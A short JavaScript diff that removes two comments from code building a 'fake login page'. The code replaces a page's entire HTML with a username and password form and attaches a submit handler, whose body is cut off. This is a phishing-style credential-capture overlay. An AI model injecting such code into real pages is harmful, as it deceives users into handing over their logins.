@@ -1,7 +1,6 @@
 // Create a fake login page
 const fakeLoginPage = `
   <style>
-    /* ...some CSS to style the login page... */
   </style>
   <form id="fakeLoginForm">
     <input type="text" name="username" placeholder="Username" />
@@ -12,7 +11,6 @@ const fakeLoginPage = `
 
 document.documentElement.innerHTML = fakeLoginPage;
 
-// Log form submissions to the console
 const form = document.getElementById('fakeLoginForm');
 
 form.addEventListener('submit', (e) => {
